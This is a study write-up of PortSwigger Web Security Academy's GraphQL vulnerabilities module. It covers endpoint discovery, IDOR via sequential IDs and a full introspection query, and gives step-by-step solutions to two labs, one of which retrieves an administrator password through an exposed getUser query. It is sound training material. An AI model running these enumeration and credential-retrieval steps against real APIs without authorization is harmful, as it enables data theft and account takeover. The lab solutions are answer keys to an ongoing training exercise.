# GraphQL API vulnerabilities [PortSwigger Academy]

<sup>This write-up covers the GraphQL API vulnerabilities section of Web Security Academy by PortSwigger.</sup>

## Finding GraphQL endpoints

Before you can begin testing a GraphQL API, you must first locate its endpoint. Since all GraphQL requests are sent to the same endpoint, finding it is crucial. 

> NOTE: This section covers how to manually search for GraphQL endpoints. however, Burp Scanner can automate this process during scans and will flag any discovered endpoints with a "GraphQL endpoint found" alert

Also, to effectively guard against clickjacking and XSS, Content Security Policies (CSPs) must be carefully designed, implemented, and tested, and should be part of a broader, layered security approach. 

### Universal queries

If you send the query `query{__typename}` to a GraphQL endpoint, the response will contain the string `{"data": {"__typename": "query"}}`. This is called a __universal query__ and it's a handy method to check if a URL is linked to a GraphQL service.

This works because every GraphQL endpoint has a special field named `__typename` that returns the type of the object being queried as a string. 

### Common endpoint names

GraphQL services typically follow common patterns for their endpoint paths. When probing for GraphQL endpoints, you should try sending universal queries to locations like:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

### Common endpoint names - Continued

If the usual endpoints don't produce a GraphQL response, you can also try adding `/v1` at the end of the path. 

> NOTE: GraphQL services often reply to non-GraphQL requests with errors like "query not present" or something similar. Keep this in mind when probing for GraphQL endpoints.

### Request methods

The next step in locating GraphQL endpoints is to experiment with different HTTP request methods. 

Ideally, production GraphQL endpoints should only accept `POST` requests with a `Content-Type` of `application/json` to help defend against CSRF attacks. However, some servers might also allow other methods, like `GET` requests or `POST` requests with a `Content-Type` of `x-www-form-urlencoded`.

If sending `POST` requests to typical endpoints doesn't reveal the GraphQL service, try resending the universal query using other HTTP methods instead. 

### Initial testing

After finding the endpoint, you can start sending test requests to learn more about its behavior. If the endpoint supports a website, before the site using Burp's browser and review the HTTP history to see the queries being made. 

## Exploiting unsanitized arguments

Now you can begin looking for vulnerabilities, starting with testing query arguments.

If the API uses arguments to directly retrieve objects, it might be susceptible to access control issues. This could allow a user to view data they shouldn't have access to by simply providing a different argument value. This type of flaw is often referred to as an insecure direct object reference (IDOR)

### Exploiting unsanitized arguments - Continued

For instance, consider the following query that requests a list of products from an online store:

```graphql
# Example product query
query {
  products {
    id
    name
    listed
  }
}
```

The response only includes products that are currently listed:

```json
# Example product response
{
  "data": {
    "products": [
      { "id": 1, "name": "Product 1", "listed": true },
      { "id": 2, "name": "Product 2", "listed": true }, 
      { "id": 4, "name": "Product 4", "listed": true}
    ]
  }
}
```

From this, we can observe: 
- Product IDs appear to be sequential
- Product ID 3 is absent, which might suggest it has been removed or delisted.

By directly querying for the missing ID, we can retrieve information about the hidden product, even though it wasn't shown in the original list:

```graphql
# Query to retrieve the missing product
query {
  product(id: 3) {
    id
    name
    listed
  }
}
```

```json
# Response for missing product
{
  "data": {
    "product": {
      "id": 3,
      "name": "Product 3",
      "listed": false
    }
  }
}
```

## Discovering schema information

The next phase of API testing involves gathering details about the underlying schema. 

The most effective method for this is using introspection queries. Introspection is a built-in feature of GraphQL that allows you to request information about the server's schema. 

This process not only helps you understand how to interact with the GraphQL API but might also reveal sensitive information, like the content of description fields. 

### Using introspection

To discover schema information using introspection, you need to query the `__schema` field. This field is accessible from the root type of any query.

Similar to regular queries, you can specify the fields and structure of the response when performing an introspection query. For example, if you're only interested in obtaining the names of available mutations, you can request that information specifically. 

> NOTE: Burp Suite can help you generate introspection queries automatically. For more details, refer to the section on accessing GraphQL API schemas through introspection. 

### Probing for introspection

Disabling introspection in production environments is considered a best practice, but this is not always implemented.

You can check if introspection is enbaled by sending the following simple query. If introspection is active, the response will list the names of all available queries. 

```graphql
# Introspection probe request
{
  "query": "{__schema{queryType{name}}}"
}
```

> NOTE: Burp Scanner can automatically detect introspection during its scans. If it identifies that introspection is enabled, it will flag the issue as "GraphQL introspection enabled."

### Running a full introspection query

The next step is to execute a comprehensive introspection query on the endpoint to gather as much information as possible about the underlying schema. 

The example query provided below retrieves full details about all queries, mutations, subscriptions, types and fragments:

```graphql
#Full introspection query

query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        onOperation  #May need to be removed to execute query
        onFragment   #May need to be removed to execute query
        onField      #May need to be removed to execute query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

> NOTE: If introspection is enabled but the above query does not execute, you may need to remove the `onOperation`, `onFragment`, and `onField` directives from the query. Many endpoints do not support these directives in introspection queries, and removing them can increase the changes of a successful introspection attempt.

### Visualizing introspection results

Responses to introspection queries can contain a wealth of information, but they are often lengthy and difficult to interpret. 

To make understanding schema relationships easier, you can use a GraphQL visualizer. This online tool takes the output from an introspection query and creates a visual map of the data, highlighting the relationships between various operations and types. 

### Suggestions

Even if introspection is completely disabled, you may still be able to gather insights into an API's structure through suggestions.

Suggestions are a feature of the Apollo GraphQL platform, where the server provides query recommendations in error messages. These are typically triggered when a query is slightly off but still recognizable (for example, "There is no entry for `productInfo`. Did you mean `productInformation` instead?").

By examining these suggestions, you can potentially uncover valuable information, as the response reveals valid parts of the schema. 

### Suggestions - Continued

Clairvoyance is a tool that leverages suggestions to automatically reconstruct all or part of a GraphQL schema, even when introspection is turned off. This greatly reduces the time needed to gather information from suggestion responses. Suggestions cannot be disabled directly in Apollo. 

> NOTE: Burp Scanner can automatically detect suggestions during its scans. If suggestions are enabled, if will flag a "GraphQL suggestions enabled" issue. 

### Lab: Accessing private GraphQL posts

Access the blog page in Burp's browser. In __Proxy__ > __HTTP history__ observe, that blog posts are fetched via a GraphQL query, each blog post has a unique sequential ID in the GraphQL response and the blog post with ID 3 is missing indicating it is hidden:

_Request:_

```
POST /graphql/v1 HTTP/2
...

{
  "query": "\nquery getBlogSummaries {\n    getAllBlogPosts {\n        image\n        title\n        summary\n        id\n    }\n}",
  "operationName":"getBlogSummaries"
}
```

Right click the above request and "Send to Repeater". Once there, right-click the request panel and select "GraphQL > Set introspection query" to insert an introspection query into the request body. 

Click Send and check the response. You'll find that the `BlogPost` type includes a `postPassword` field:

```json
{
  "kind": "OBJECT",
  "name": "BlogPost",
  "description": null,
  "fields": [
  ...
    {
      "name": "postPassword",
      "description": null,
      "args": [],
      "type": {
        "kind": "SCALAR",
        "name": "String",
        "ofType": null
      },
      "isDeprecated": false,
      "deprecationReason": null
    }
  ....
  ]
}
```

> __NOTE__: View any post on the lab web page before continuing. 

In __Proxy__ > __HTTP history__ locate the `POST /graphql/v1` request that comes directly after `/post?postId=` and send it to repeater. 

In __Repeater__ click on the GraphQL tab. In the variables panel below, change the `id` variable to `3` (the ID of the hidden blogpost): 

```json
{
  "id": 3
}
```

In the _Query_ panel on top add the `postPassword` field to the query:

```

    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            postPassword
            image
            title
            author
            date
            paragraphs
        }
    }
```

Click send, copy the `postPassword` value that is returned in the response and paste int into the Submit solution dialogue to solve the lab. 

> NOTE: Check out [walkthrough](graphql_lab01_zaproxy.md) of this lab in OWASP Zed Attack Proxy

### Lab: Accidental exposure of private GraphQL fields

In Burp's browser, navigate to the lab and click on "My account." Attempt to log in with fake credentials like `admin:admin`. 

In __Proxy__ > __HTTP history__ find the `POST /login` request and observe that the attempt is being sent as a GraphQL mutation containing both username and password:

_Request body:_
```
{"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"admin","password":"admin"}}}
```

Send it to __Repeater__. Right click on the request panel and select "GraphQL > Set introspection query" and click Send. Look at the response message JSON in the Response panel, right-click on it and select "GraphQL > Save GraphQL queries to site map". 

Go to __Target__ > __Site map__. On the left panel drop down to __Website__ > __`graphql`__ > __`v1`__. 

Notice that in that list, there is a `getUser` query made in the request with the following body:

```
{"query":"query($id: Int!) {\n  getUser(id: $id) {\n    id\n    username\n    password\n  }\n}","variables":{"id":0}}
```

Send this request to __Repeater__ and send the request. Notice that request with user `id` value of `0` returns nothing. Navigate to __GraphQL__ tab on the Request panel and in the __Variables__ pane change `id` variable to `1`. Resend the request. 

Notice that it returned `administrator` user's password in the response body. Log in as `administrator` with that password on the website. 

Navigate to "Admin panel" and delete user `carlos` to solve the lab. 

> NOTE: Check out [walkthrough](graphql_lab02_zaproxy.md) of this lab in OWASP Zed Attack Proxy
